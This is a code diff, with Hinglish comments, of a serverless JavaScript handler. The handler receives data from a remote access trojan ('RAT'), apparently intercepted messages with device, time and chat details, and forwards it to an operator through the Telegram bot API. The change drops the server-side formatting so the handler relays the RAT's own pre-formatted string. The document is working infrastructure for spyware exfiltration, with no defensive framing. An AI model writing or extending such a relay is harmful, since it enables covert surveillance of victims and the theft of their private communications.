@@ -16,57 +16,31 @@ export default async function handler(request, response) {
         return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    if (Object.keys(data).length === 0) {
-        return response.status(400).json({ error: 'No data received' });
+    // Yahan hum data object se pehli value nikal rahe hain,
+    // jo ki tera pre-formatted message string hai.
+    const preFormattedMessage = Object.values(data)[0];
+
+    if (!preFormattedMessage || typeof preFormattedMessage !== 'string') {
+        return response.status(400).json({ error: 'RAT is not sending a valid message string.' });
     }
 
     try {
-        // ### YAHAN MAGIC HO RAHA HAI ###
-        // Main data object ko ek string mein badal raha hoon
-        const dataString = Object.entries(data)
-            .map(([key, value]) => `${key}: ${value}`)
-            .join('\n');
-
-        // Ab us string se SENT ya RECEIVED dhoondh raha hoon
-        let statusBlock;
-        if (dataString.toLowerCase().includes('sent')) {
-            statusBlock = '📤 SENT';
-        } else {
-            statusBlock = '📥 RECEIVED';
-        }
-
-        // Key-value pairs se important data nikal raha hoon
-        // Ye tere gande format ko bhi handle kar lega
-        const model = data.model || data.device || 'Unknown Device';
-        const time = data.time || 'N/A';
-        const chat = data.chat || 'N/A';
-        const message = data.message || '';
-
-        // Final message ko tere style mein jod raha hoon
-        const formattedMessage = `
-📱 ${model}
-🕚 Time: ${time}
-
-${statusBlock}
-
-Chat: ${chat}
-Message: ${message}
-        `.trim().replace(/\*\*|__/g, ''); // Ye faltu ke ** ko hata dega
-
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
+        // Yahan hum wahi string bhej rahe hain jo RAT se aayi hai.
+        // Koi extra formatting nahi.
         await fetch(telegramApiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: formattedMessage,
+                text: preFormattedMessage,
             }),
         });
         
         return response.status(200).json({ status: 'ok' });
     } catch (error) {
         console.error(error);
-        return response.status(500).json({ error: 'Failed to forward data' });
+        return response.status(500).json({ error: 'Failed to forward the damn message' });
     }
-}
+            }
